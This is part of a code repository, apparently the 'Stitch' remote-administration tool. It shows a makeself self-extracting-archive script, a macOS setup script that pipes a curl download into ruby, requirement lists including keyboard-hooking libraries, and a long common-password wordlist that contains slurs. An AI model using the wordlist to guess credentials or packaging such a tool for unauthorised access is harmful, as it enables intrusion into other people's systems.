# - 2.1.0 : Allow multiple tarballs to be stored in one archive, and incremental updates.
#           Added --nochown for archives
#           Stopped doing redundant checksums when not necesary
# - 2.1.1 : Work around insane behavior from certain Linux distros with no 'uncompress' command
#           Cleaned up the code to handle error codes from compress. Simplified the extraction code.
# - 2.1.2 : Some bug fixes. Use head -n to avoid problems.
# - 2.1.3 : Bug fixes with command line when spawning terminals.
#           Added --tar for archives, allowing to give arbitrary arguments to tar on the contents of the archive.
#           Added --noexec to prevent execution of embedded scripts.
#           Added --nomd5 and --nocrc to avoid creating checksums in archives.
#           Added command used to create the archive in --info output.
#           Run the embedded script through eval.
# - 2.1.4 : Fixed --info output.
#           Generate random directory name when extracting files to . to avoid problems. (Jason Trent)
#           Better handling of errors with wrong permissions for the directory containing the files. (Jason Trent)
#           Avoid some race conditions (Ludwig Nussel)
#           Unset the $CDPATH variable to avoid problems if it is set. (Debian)
#           Better handling of dot files in the archive directory.
# - 2.1.5 : Made the md5sum detection consistent with the header code.
#           Check for the presence of the archive directory
#           Added --encrypt for symmetric encryption through gpg (Eric Windisch)
#           Added support for the digest command on Solaris 10 for MD5 checksums
#           Check for available disk space before extracting to the target directory (Andreas Schweitzer)
#           Allow extraction to run asynchronously (patch by Peter Hatch)
#           Use file descriptors internally to avoid error messages (patch by Kay Tiong Khoo)
# - 2.1.6 : Replaced one dot per file progress with a realtime progress percentage and a spining cursor (Guy Baconniere)
#           Added --noprogress to prevent showing the progress during the decompression (Guy Baconniere)
#           Added --target dir to allow extracting directly to a target directory (Guy Baconniere)
# - 2.2.0 : Many bugfixes, updates and contributions from users. Check out the project page on Github for the details.
#
# (C) 1998-2013 by Stephane Peter <megastep@megastep.org>
#
# This software is released under the terms of the GNU GPL version 2 and above
# Please read the license at http://www.gnu.org/copyleft/gpl.html
#

MS_VERSION=2.2.0
MS_COMMAND="$0"
unset CDPATH

for f in "${1+"$@"}"; do
    MS_COMMAND="$MS_COMMAND \\\\
    \\\"$f\\\""
done

# Procedures

MS_Usage()
{
    echo "Usage: $0 [params] archive_dir file_name label startup_script [args]"
    echo "params can be one or more of the following :"
    echo "    --version | -v     : Print out Makeself version number and exit"
    echo "    --help | -h        : Print out this help message"
    echo "    --tar-quietly      : Suppress verbose output from the tar command"
    echo "    --quiet | -q       : Do not print any messages other than errors."
    echo "    --gzip             : Compress using gzip (default if detected)"
    echo "    --pigz		 : Compress with pigz"
    echo "    --bzip2            : Compress using bzip2 instead of gzip"
    echo "    --pbzip2           : Compress using pbzip2 instead of gzip"
    echo "    --xz               : Compress using xz instead of gzip"
    echo "    --lzo              : Compress using lzop instead of gzip"
    echo "    --lz4              : Compress using lz4 instead of gzip"
    echo "    --compress         : Compress using the UNIX 'compress' command"
    echo "    --complevel lvl    : Compression level for gzip pigz xz lzo lz4 bzip2 and pbzip2 (default 9)"
    echo "    --base64           : Instead of compressing, encode the data using base64"
    echo "    --gpg-encrypt      : Instead of compressing, encrypt the data using GPG"
    echo "    --ssl-encrypt      : Instead of compressing, encrypt the data using OpenSSL"
    echo "    --nocomp           : Do not compress the data"
    echo "    --notemp           : The archive will create archive_dir in the"
    echo "                         current directory and uncompress in ./archive_dir"
    echo "    --copy             : Upon extraction, the archive will first copy itself to"
    echo "                         a temporary directory"
    echo "    --append           : Append more files to an existing Makeself archive"
    echo "                         The label and startup scripts will then be ignored"
    echo "    --target dir       : Extract directly to a target directory"
    echo "                         directory path can be either absolute or relative"
    echo "    --nooverwrite      : Do not extract the archive if the specified target directory exists"
    echo "    --current          : Files will be extracted to the current directory"
    echo "                         Both --current and --target imply --notemp"
    echo "    --tar-extra opt    : Append more options to the tar command line"
    echo "    --nomd5            : Don't calculate an MD5 for archive"
    echo "    --nocrc            : Don't calculate a CRC for archive"
    echo "    --header file      : Specify location of the header script"
    echo "    --follow           : Follow the symlinks in the archive"
    echo "    --noprogress       : Do not show the progress during the decompression"
    echo "    --nox11            : Disable automatic spawn of a xterm"
    echo "    --nowait           : Do not wait for user input after executing embedded"
    echo "                         program from an xterm"
    echo "    --lsm file         : LSM file describing the package"
    echo "    --license file     : Append a license file"
    echo "    --help-header file : Add a header to the archive's --help output"
    echo
    echo "    --keep-umask       : Keep the umask set to shell default, rather than overriding when executing self-extracting archive."
    echo
    echo "Do not forget to give a fully qualified startup script name"
    echo "(i.e. with a ./ prefix if inside the archive)."
    exit 1
}

# Default settings
if type gzip 2>&1 > /dev/null; then
    COMPRESS=gzip
else
    COMPRESS=Unix
fi
COMPRESS_LEVEL=9
KEEP=n
CURRENT=n
NOX11=n
NOWAIT=n
APPEND=n
TAR_QUIETLY=n
KEEP_UMASK=n
QUIET=n
NOPROGRESS=n
COPY=none
TAR_ARGS=cvf
TAR_EXTRA=""
DU_ARGS=-ks
HEADER=`dirname "$0"`/makeself-header.sh
TARGETDIR=""
NOOVERWRITE=n

# LSM file stuff
LSM_CMD="echo No LSM. >> \"\$archname\""

while true
do
    case "$1" in
    --version | -v)
	echo Makeself version $MS_VERSION
	exit 0
	;;
    --pbzip2)
	COMPRESS=pbzip2
	shift
	;;
    --bzip2)
	COMPRESS=bzip2
	shift
	;;
    --gzip)
	COMPRESS=gzip
	shift
	;;
    --pigz)
    	COMPRESS=pigz
    	shift
    	;;
    --xz)
	COMPRESS=xz
	shift
	;;
    --lzo)
	COMPRESS=lzo
	shift
	;;
    --lz4)
	COMPRESS=lz4
	shift
	;;
    --compress)
	COMPRESS=Unix
	shift
	;;
    --base64)
	COMPRESS=base64
	shift
	;;
    --gpg-encrypt)
	COMPRESS=gpg
	shift
	;;
    --ssl-encrypt)
        COMPRESS=openssl
        shift
        ;;
    --nocomp)
	COMPRESS=none
	shift
	;;
    --complevel)
	COMPRESS_LEVEL="$2"
	if ! shift 2; then MS_Help; exit 1; fi
	;;
    --notemp)
	KEEP=y
	shift
	;;
    --copy)
	COPY=copy
	shift
	;;
    --current)
	CURRENT=y
	KEEP=y
	shift
	;;
    --tar-extra)
	TAR_EXTRA="$2"
        if ! shift 2; then MS_Help; exit 1; fi
        ;;
    --target)
	TARGETDIR="$2"
	KEEP=y
        if ! shift 2; then MS_Help; exit 1; fi
	;;
    --nooverwrite)
        NOOVERWRITE=y
	shift
        ;;
    --header)
	HEADER="$2"
        if ! shift 2; then MS_Help; exit 1; fi
	;;
    --license)
        LICENSE=`cat $2`
        if ! shift 2; then MS_Help; exit 1; fi
    ;;
    --follow)
	TAR_ARGS=cvhf
	DU_ARGS=-ksL
	shift
	;;
    --noprogress)
	NOPROGRESS=y
	shift
	;;
    --nox11)
	NOX11=y
	shift
	;;
    --nowait)
	NOWAIT=y
	shift
	;;
    --nomd5)
	NOMD5=y
	shift
	;;
    --nocrc)
	NOCRC=y
	shift
	;;
    --append)
	APPEND=y
	shift
	;;
    --lsm)
	LSM_CMD="cat \"$2\" >> \"\$archname\""
    if ! shift 2; then MS_Help; exit 1; fi
	;;
    --help-header)
	HELPHEADER=`sed -e "s/'/'\\\\\''/g" $2`
    if ! shift 2; then MS_Help; exit 1; fi
	[ -n "$HELPHEADER" ] && HELPHEADER="$HELPHEADER
"
    ;;
    --tar-quietly)
	TAR_QUIETLY=y
	shift
	;;
	--keep-umask)
	KEEP_UMASK=y
	shift
	;;
    -q | --quiet)
	QUIET=y
	shift
	;;
    -h | --help)
	MS_Usage
	;;
    -*)
	echo Unrecognized flag : "$1"
	MS_Usage
	;;
    *)
	break
	;;
    esac
done

if test $# -lt 1; then
	MS_Usage
else
	if test -d "$1"; then
		archdir="$1"
	else
		echo "Directory $1 does not exist." >&2
		exit 1
	fi
fi
archname="$2"

if test "$QUIET" = "y" || test "$TAR_QUIETLY" = "y"; then
    if test "$TAR_ARGS" = "cvf"; then
	TAR_ARGS="cf"
    elif test "$TAR_ARGS" = "cvhf";then
	TAR_ARGS="chf"
    fi
fi

if test "$APPEND" = y; then
    if test $# -lt 2; then
	MS_Usage
    fi

    # Gather the info from the original archive
    OLDENV=`sh "$archname" --dumpconf`
    if test $? -ne 0; then
	echo "Unable to update archive: $archname" >&2
	exit 1
    else
	eval "$OLDENV"
    fi
else
    if test "$KEEP" = n -a $# = 3; then
	echo "ERROR: Making a temporary archive with no embedded command does not make sense!" >&2
	echo >&2
	MS_Usage
    fi
    # We don't want to create an absolute directory unless a target directory is defined
    if test "$CURRENT" = y; then
	archdirname="."
    elif test x$TARGETDIR != x; then
	archdirname="$TARGETDIR"
    else
	archdirname=`basename "$1"`
    fi

    if test $# -lt 3; then
	MS_Usage
    fi

    LABEL="$3"
    SCRIPT="$4"
    test "x$SCRIPT" = x || shift 1
    shift 3
    SCRIPTARGS="$*"
fi

if test "$KEEP" = n -a "$CURRENT" = y; then
    echo "ERROR: It is A VERY DANGEROUS IDEA to try to combine --notemp and --current." >&2
    exit 1
fi

case $COMPRESS in
gzip)
    GZIP_CMD="gzip -c$COMPRESS_LEVEL"
    GUNZIP_CMD="gzip -cd"
    ;;
pigz) 
    GZIP_CMD="pigz -$COMPRESS_LEVEL"
    GUNZIP_CMD="gzip -cd"
    ;;
pbzip2)
    GZIP_CMD="pbzip2 -c$COMPRESS_LEVEL"
    GUNZIP_CMD="bzip2 -d"
    ;;
bzip2)
    GZIP_CMD="bzip2 -$COMPRESS_LEVEL"
    GUNZIP_CMD="bzip2 -d"
    ;;
xz)
    GZIP_CMD="xz -c$COMPRESS_LEVEL"
    GUNZIP_CMD="xz -d"
    ;;
lzo)
    GZIP_CMD="lzop -c$COMPRESS_LEVEL"
    GUNZIP_CMD="lzop -d"
    ;;
lz4)
    GZIP_CMD="lz4 -c$COMPRESS_LEVEL"
    GUNZIP_CMD="lz4 -d"
    ;;
base64)
    GZIP_CMD="base64"
    GUNZIP_CMD="base64 -d -i"
    ;;
gpg)
    GZIP_CMD="gpg -ac -z$COMPRESS_LEVEL"
    GUNZIP_CMD="gpg -d"
    ;;
openssl)
    GZIP_CMD="openssl aes-256-cbc -a -salt"
    GUNZIP_CMD="openssl aes-256-cbc -d -a"
    ;;
Unix)
    GZIP_CMD="compress -cf"
    GUNZIP_CMD="exec 2>&-; uncompress -c || test \\\$? -eq 2 || gzip -cd"
    ;;
none)
    GZIP_CMD="cat"
    GUNZIP_CMD="cat"
    ;;
esac

tmpfile="${TMPDIR:=/tmp}/mkself$$"

if test -f "$HEADER"; then
	oldarchname="$archname"
	archname="$tmpfile"
	# Generate a fake header to count its lines
	SKIP=0
    . "$HEADER"
    SKIP=`cat "$tmpfile" |wc -l`
	# Get rid of any spaces
	SKIP=`expr $SKIP`
	rm -f "$tmpfile"
    if test "$QUIET" = "n";then
    	echo Header is $SKIP lines long >&2
    fi

	archname="$oldarchname"
else
    echo "Unable to open header file: $HEADER" >&2
    exit 1
fi

if test "$QUIET" = "n";then 
    echo
fi

if test "$APPEND" = n; then
    if test -f "$archname"; then
		echo "WARNING: Overwriting existing file: $archname" >&2
    fi
fi

USIZE=`du $DU_ARGS "$archdir" | awk '{print $1}'`
DATE=`LC_ALL=C date`

if test "." = "$archdirname"; then
	if test "$KEEP" = n; then
		archdirname="makeself-$$-`date +%Y%m%d%H%M%S`"
	fi
fi

test -d "$archdir" || { echo "Error: $archdir does not exist."; rm -f "$tmpfile"; exit 1; }
if test "$QUIET" = "n";then
   echo About to compress $USIZE KB of data...
   echo Adding files to archive named \"$archname\"...
fi
exec 3<> "$tmpfile"
(cd "$archdir" && ( tar $TAR_EXTRA -$TAR_ARGS - . | eval "$GZIP_CMD" >&3 ) ) || { echo Aborting: Archive directory not found or temporary file: "$tmpfile" could not be created.; exec 3>&-; rm -f "$tmpfile"; exit 1; }
exec 3>&- # try to close the archive

fsize=`cat "$tmpfile" | wc -c | tr -d " "`

# Compute the checksums

md5sum=00000000000000000000000000000000
crcsum=0000000000

if test "$NOCRC" = y; then
	if test "$QUIET" = "n";then
		echo "skipping crc at user request"
	fi
else
	crcsum=`cat "$tmpfile" | CMD_ENV=xpg4 cksum | sed -e 's/ /Z/' -e 's/	/Z/' | cut -dZ -f1`
	if test "$QUIET" = "n";then
		echo "CRC: $crcsum"
	fi
fi

if test "$NOMD5" = y; then
	if test "$QUIET" = "n";then
		echo "skipping md5sum at user request"
	fi
else
	# Try to locate a MD5 binary
	OLD_PATH=$PATH
	PATH=${GUESS_MD5_PATH:-"$OLD_PATH:/bin:/usr/bin:/sbin:/usr/local/ssl/bin:/usr/local/bin:/opt/openssl/bin"}
	MD5_ARG=""
	MD5_PATH=`exec <&- 2>&-; which md5sum || command -v md5sum || type md5sum`
	test -x "$MD5_PATH" || MD5_PATH=`exec <&- 2>&-; which md5 || command -v md5 || type md5`
	test -x "$MD5_PATH" || MD5_PATH=`exec <&- 2>&-; which digest || command -v digest || type digest`
	PATH=$OLD_PATH
	if test -x "$MD5_PATH"; then
		if test `basename ${MD5_PATH}`x = digestx; then
			MD5_ARG="-a md5"
		fi
		md5sum=`cat "$tmpfile" | eval "$MD5_PATH $MD5_ARG" | cut -b-32`;
		if test "$QUIET" = "n";then
			echo "MD5: $md5sum"
		fi
	else
		if test "$QUIET" = "n";then
			echo "MD5: none, MD5 command not found"
		fi
	fi
fi

if test "$APPEND" = y; then
    mv "$archname" "$archname".bak || exit

    # Prepare entry for new archive
    filesizes="$filesizes $fsize"
    CRCsum="$CRCsum $crcsum"
    MD5sum="$MD5sum $md5sum"
    USIZE=`expr $USIZE + $OLDUSIZE`
    # Generate the header
    . "$HEADER"
    # Append the original data
    tail -n +$OLDSKIP "$archname".bak >> "$archname"
    # Append the new data
    cat "$tmpfile" >> "$archname"

    chmod +x "$archname"
    rm -f "$archname".bak
    if test "$QUIET" = "n";then
    	echo Self-extractable archive \"$archname\" successfully updated.
    fi
else
    filesizes="$fsize"
    CRCsum="$crcsum"
    MD5sum="$md5sum"

    # Generate the header
    . "$HEADER"

    # Append the compressed tar data after the stub
    if test "$QUIET" = "n";then
    	echo
    fi
    cat "$tmpfile" >> "$archname"
    chmod +x "$archname"
    if test "$QUIET" = "n";then
    	echo Self-extractable archive \"$archname\" successfully created.
    fi
fi
rm -f "$tmpfile"

```

`Tools/osx_dev_setup.sh`:

```sh
#!/usr/bin/bash
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
# Installs brew
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
# Installs git
brew install git
# OSX has some issues with python and openssl
# this is just to avoid issues in other python projects
brew install openssl
brew install python --with brewed-openssl
# installs pip and then pip installs the required modules
sudo easy_install pip
sudo pip install pycrypto pexpect requests colorama pyreadline readline pyinstaller

```

`Tools/passwords.txt`:

```txt
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
696969
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
pussy
superman
1qaz2wsx
7777777
fuckyou
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
fuckme
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
asshole
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
fuck
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
6969
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
william
corvette
hello
martin
heather
secret
fucker
merlin
diamond
1234qwer
gfhjkm
hammer
silver
222222
88888888
anthony
justin
test
bailey
q1w2e3r4t5
patrick
internet
scooter
orange
11111
golfer
cookie
richard
samantha
bigdog
guitar
jackson
whatever
mickey
chicken
sparky
snoopy
maverick
phoenix
camaro
sexy
peanut
morgan
welcome
falcon
cowboy
ferrari
samsung
andrea
smokey
steelers
joseph
mercedes
dakota
arsenal
eagles
melissa
boomer
booboo
spider
nascar
monster
tigers
yellow
xxxxxx
123123123
gateway
marina
diablo
bulldog
qwer1234
compaq
purple
hardcore
banana
junior
hannah
123654
porsche
lakers
iceman
money
cowboys
987654
london
tennis
999999
ncc1701
coffee
scooby
0000
miller
boston
q1w2e3r4
fuckoff
brandon
yamaha
chester
mother
forever
johnny
edward
333333
oliver
redsox
player
nikita
knight
fender
barney
midnight
please
brandy
chicago
badboy
iwantu
slayer
rangers
charles
angel
flower
bigdaddy
rabbit
wizard
bigdick
jasper
enter
rachel
chris
steven
winner
adidas
victoria
natasha
1q2w3e4r
jasmine
winter
prince
panties
marine
ghbdtn
fishing
cocacola
casper
james
232323
raiders
888888
marlboro
gandalf
asdfasdf
crystal
87654321
12344321
sexsex
golden
blowme
bigtits
8675309
panther
lauren
angela
bitch
spanky
thx1138
angels
madison
winston
shannon
mike
toyota
blowjob
jordan23
canada
sophie
Password
apples
dick
tiger
razz
123abc
pokemon
qazxsw
55555
qwaszx
muffin
johnson
murphy
cooper
jonathan
liverpoo
david
danielle
159357
jackie
1990
123456a
789456
turtle
horny
abcd1234
scorpion
qazwsxedc
101010
butter
carlos
password1
dennis
slipknot
qwerty123
booger
asdf
1991
black
startrek
12341234
cameron
newyork
rainbow
nathan
john
1992
rocket
viking
redskins
butthead
asdfghjkl
1212
sierra
peaches
gemini
doctor
wilson
sandra
helpme
qwertyui
victor
florida
dolphin
pookie
captain
tucker
blue
liverpool
theman
bandit
dolphins
maddog
packers
jaguar
lovers
nicholas
united
tiffany
maxwell
zzzzzz
nirvana
jeremy
suckit
stupid
porn
monica
elephant
giants
jackass
hotdog
rosebud
success
debbie
mountain
444444
xxxxxxxx
warrior
1q2w3e4r5t
q1w2e3
123456q
albert
metallic
lucky
azerty
7777
shithead
alex
bond007
alexis
1111111
samson
5150
willie
scorpio
bonnie
gators
benjamin
voodoo
driver
dexter
2112
jason
calvin
freddy
212121
creative
12345a
sydney
rush2112
1989
asdfghjk
red123
bubba
4815162342
passw0rd
trouble
gunner
happy
fucking
gordon
legend
jessie
stella
qwert
eminem
arthur
apple
nissan
bullshit
bear
america
1qazxsw2
nothing
parker
4444
rebecca
qweqwe
garfield
01012011
beavis
69696969
jack
asdasd
december
2222
102030
252525
11223344
magic
apollo
skippy
315475
girls
kitten
golf
copper
braves
shelby
godzilla
beaver
fred
tomcat
august
buddy
airborne
1993
1988
lifehack
qqqqqq
brooklyn
animal
platinum
phantom
online
xavier
darkness
blink182
power
fish
green
789456123
voyager
police
travis
12qwaszx
heaven
snowball
lover
abcdef
00000
pakistan
007007
walter
playboy
blazer
cricket
sniper
hooters
donkey
willow
loveme
saturn
therock
redwings
bigboy
pumpkin
trinity
williams
tits
nintendo
digital
destiny
topgun
runner
marvin
guinness
chance
bubbles
testing
fire
november
minecraft
asdf1234
lasvegas
sergey
broncos
cartman
private
celtic
birdie
little
cassie
babygirl
donald
beatles
1313
dickhead
family
12121212
school
louise
gabriel
eclipse
fluffy
147258369
lol123
explorer
beer
nelson
flyers
spencer
scott
lovely
gibson
doggie
cherry
andrey
snickers
buffalo
pantera
metallica
member
carter
qwertyu
peter
alexande
steve
bronco
paradise
goober
5555
samuel
montana
mexico
dreams
michigan
cock
carolina
yankee
friends
magnum
surfer
poopoo
maximus
genius
cool
vampire
lacrosse
asd123
aaaa
christin
kimberly
speedy
sharon
carmen
111222
kristina
sammy
racing
ou812
sabrina
horses
0987654321
qwerty1
pimpin
baby
stalker
enigma
147147
star
poohbear
boobies
147258
simple
bollocks
12345q
marcus
brian
1987
qweasdzxc
drowssap
hahaha
caroline
barbara
dave
viper
drummer
action
einstein
bitches
genesis
hello1
scotty
friend
forest
010203
hotrod
google
vanessa
spitfire
badger
maryjane
friday
alaska
1232323q
tester
jester
jake
champion
billy
147852
rock
hawaii
badass
chevy
420420
walker
stephen
eagle1
bill
1986
october
gregory
svetlana
pamela
1984
music
shorty
westside
stanley
diesel
courtney
242424
kevin
porno
hitman
boobs
mark
12345qwert
reddog
frank
qwe123
popcorn
patricia
aaaaaaaa
1969
teresa
mozart
buddha
anderson
paul
melanie
abcdefg
security
lucky1
lizard
denise
3333
a12345
123789
ruslan
stargate
simpsons
scarface
eagle
123456789a
thumper
olivia
naruto
1234554321
general
cherokee
a123456
vincent
Usuckballz1
spooky
qweasd
cumshot
free
frankie
douglas
death
1980
loveyou
kitty
kelly
veronica
suzuki
semperfi
penguin
mercury
liberty
spirit
scotland
natalie
Password1
marley
vikings
system
sucker
king
allison
marshall
1979
098765
qwerty12
hummer
adrian
1985
vfhbyf
sandman
rocky
leslie
antonio
98765432
4321
softball
passion
mnbvcxz
bastard
passport
horney
rascal
howard
franklin
bigred
assman
alexander
homer
redrum
jupiter
claudia
55555555
141414
zaq12wsx
shit
patches
nigger
cunt
raider
infinity
andre
54321
galore
college
russia
kawasaki
bishop
77777777
vladimir
money1
freeuser
wildcats
francis
disney
budlight
brittany
1994
00000000
sweet
oksana
honda
domino
bulldogs
brutus
swordfis
norman
monday
jimmy
ironman
ford
fantasy
9999
7654321
PASSWORD
hentai
duncan
cougar
1977
jeffrey
house
dancer
brooke
timothy
super
marines
justice
digger
connor
patriots
karina
202020
molly
everton
tinker
alicia
rasdzv3
poop
pearljam
stinky
naughty
colorado
123123a
water
test123
ncc1701d
motorola
ireland
asdfg
slut
matt
houston
boogie
zombie
accord
vision
bradley
reggie
kermit
froggy
ducati
avalon
6666
9379992
sarah
saints
logitech
chopper
852456
simpson
madonna
juventus
claire
159951
zachary
yfnfif
wolverin
warcraft
hello123
extreme
penis
peekaboo
fireman
eugene
brenda
123654789
russell
panthers
georgia
smith
skyline
jesus
elizabet
spiderma
smooth
pirate
empire
bullet
8888
virginia
valentin
psycho
predator
arizona
134679
mitchell
alyssa
vegeta
titanic
christ
goblue
fylhtq
wolf
mmmmmm
kirill
indian
hiphop
baxter
awesome
people
danger
roland
mookie
741852963
1111111111
dreamer
bambam
arnold
1981
skipper
serega
rolltide
elvis
changeme
simon
1q2w3e
lovelove
fktrcfylh
denver
tommy
mine
loverboy
hobbes
happy1
alison
nemesis
chevelle
cardinal
burton
wanker
picard
151515
tweety
michael1
147852369
12312
xxxx
windows
turkey
456789
1974
vfrcbv
sublime
1975
galina
bobby
newport
manutd
daddy
american
alexandr
1966
victory
rooster
qqq111
madmax
electric
bigcock
a1b2c3
wolfpack
spring
phpbb
lalala
suckme
spiderman
eric
darkside
classic
raptor
123456789q
hendrix
1982
wombat
avatar
alpha
zxc123
crazy
hard
england
brazil
1978
01011980
wildcat
polina
freepass

```

`_config.yml`:

```yml
theme: jekyll-theme-hacker
```

`lnx_requirements.txt`:

```txt
colorama==0.3.7
email==4.0.2
logging==0.4.9.6
pexpect==4.2.1
pycrypto==2.6.1
PyInstaller==3.2
python-dateutil==2.5.3
python-xlib==0.18
pyudev==0.15
pyxattr==0.5.1
PIL==1.1.7
pyreadline==2.1
readline==6.2.4.1
requests==2.12.2

```

`main.py`:

```py
#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

from Application.stitch_cmd import *

server_main()

```

`osx_requirements.txt`:

```txt
colorama==0.3.7
pexpect==4.2.1
email==4.0.2
logging==0.4.9.6
pycrypto==2.6.1
PyInstaller==3.2
PIL==1.1.7
pyreadline==2.1
python-dateutil==1.5
readline==6.2.4.1
requests==2.12.2
pyobjc-core==2.5.1
pyobjc-framework-Accounts==2.5.1
pyobjc-framework-AddressBook==2.5.1
pyobjc-framework-AppleScriptKit==2.5.1
pyobjc-framework-AppleScriptObjC==2.5.1
pyobjc-framework-Automator==2.5.1
pyobjc-framework-CFNetwork==2.5.1
pyobjc-framework-Cocoa==2.5.1
pyobjc-framework-Collaboration==2.5.1
pyobjc-framework-CoreData==2.5.1
pyobjc-framework-CoreLocation==2.5.1
pyobjc-framework-CoreText==2.5.1
pyobjc-framework-DictionaryServices==2.5.1
pyobjc-framework-EventKit==2.5.1
pyobjc-framework-ExceptionHandling==2.5.1
pyobjc-framework-FSEvents==2.5.1
pyobjc-framework-InputMethodKit==2.5.1
pyobjc-framework-InstallerPlugins==2.5.1
pyobjc-framework-InstantMessage==2.5.1
pyobjc-framework-LatentSemanticMapping==2.5.1
pyobjc-framework-LaunchServices==2.5.1
pyobjc-framework-Message==2.5.1
pyobjc-framework-OpenDirectory==2.5.1
pyobjc-framework-PreferencePanes==2.5.1
pyobjc-framework-PubSub==2.5.1
pyobjc-framework-QTKit==2.5.1
pyobjc-framework-Quartz==2.5.1
pyobjc-framework-ScreenSaver==2.5.1
pyobjc-framework-ScriptingBridge==2.5.1
pyobjc-framework-SearchKit==2.5.1
pyobjc-framework-ServiceManagement==2.5.1
pyobjc-framework-Social==2.5.1
pyobjc-framework-SyncServices==2.5.1
pyobjc-framework-SystemConfiguration==2.5.1
pyobjc-framework-WebKit==2.5.1

```

`win_requirements.txt`:

```txt
colorama==0.3.7
email==4.0.2
logging==0.4.9.6
PIL==1.1.7
py2exe==0.6.9
pycrypto==2.6.1
pyHook==1.5.1
pyreadline==2.1
pywin32==220
requests==2.11.1
python-dateutil==1.5

```